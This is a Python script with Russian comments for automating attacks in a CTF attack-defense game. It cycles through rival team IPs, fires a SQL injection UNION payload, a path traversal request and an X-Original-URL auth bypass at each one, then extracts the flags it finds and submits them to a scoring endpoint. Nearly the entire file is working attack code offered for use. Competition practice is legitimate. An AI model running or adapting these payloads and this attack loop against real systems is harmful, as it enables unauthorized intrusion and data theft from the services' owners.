#!/usr/bin/env python3
"""
Автоматический чекер для CTF Attack-Defense
Запуск: python3 ad_checker.py
Настройка: измени TEAM_IPS, SUBMIT_URL, FLAG_REGEX под платформу
"""
import requests
import re
import time
import sys
import logging

# 🔧 КОНФИГУРАЦИЯ (ЗАПОЛНИ В ДЕНЬ ТУРНИРА)
TEAM_IPS = ["10.10.10.1", "10.10.10.2", "10.10.10.3"]  # IP команд-соперников
FLAG_REGEX = re.compile(r"flag\{[A-Za-z0-9_\-]+\}")     # Формат флага
SUBMIT_URL = "http://checker.platform.local/api/submit"  # Endpoint платформы
SUBMIT_TOKEN = "your_team_token"                         # Токен команды (если нужен)
POLL_INTERVAL = 60                                       # Секунд между раундами
TIMEOUT = 5                                              # Таймаут запросов

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    handlers=[logging.FileHandler("logs/ad_checker.log"), logging.StreamHandler()]
)

sess = requests.Session()
sess.timeout = TIMEOUT

# 🎯 ЭКСПЛОЙТЫ (ДОБАВЛЯЙ/МЕНЯЙ ПОД ЗАДАЧИ)
def exploit_sqli(target, port=8080):
    url = f"http://{target}:{port}/api/v1/user"
    params = {"id": "' UNION SELECT flag FROM flags--"}
    try:
        return sess.get(url, params=params).text
    except Exception as e:
        logging.warning(f"SQLi failed on {target}: {e}")
        return ""

def exploit_traversal(target, port=8080):
    url = f"http://{target}:{port}/static/../../../flag.txt"
    try:
        return sess.get(url).text
    except Exception as e:
        logging.warning(f"Traversal failed on {target}: {e}")
        return ""

def exploit_auth_bypass(target, port=8080):
    url = f"http://{target}:{port}/admin"
    headers = {"X-Original-URL": "/flag"}
    try:
        return sess.get(url, headers=headers).text
    except Exception as e:
        logging.warning(f"Auth bypass failed on {target}: {e}")
        return ""

# 🔍 ИЗВЛЕЧЕНИЕ И ОТПРАВКА
def extract_flags(text):
    return FLAG_REGEX.findall(text)

def submit_flag(flag):
    try:
        payload = {"flag": flag, "token": SUBMIT_TOKEN}
        r = sess.post(SUBMIT_URL, json=payload)
        if r.status_code == 200:
            logging.info(f"✅ Flag submitted: {flag}")
            return True
        logging.error(f"❌ Submit failed: {r.status_code} {r.text}")
        return False
    except Exception as e:
        logging.error(f"Submit error: {e}")
        return False

# 🔄 ГЛАВНЫЙ ЦИКЛ
def main():
    logging.info("🚀 AD Checker started. Press Ctrl+C to stop.")
    while True:
        for ip in TEAM_IPS:
            logging.info(f"🎯 Attacking {ip}...")
            responses = [
                exploit_sqli(ip),
                exploit_traversal(ip),
                exploit_auth_bypass(ip)
            ]
            for resp in responses:
                flags = extract_flags(resp)
                for f in flags:
                    submit_flag(f)
        
        logging.info(f"⏳ Sleeping {POLL_INTERVAL}s until next round...")
        time.sleep(POLL_INTERVAL)

if __name__ == "__main__":
    main()
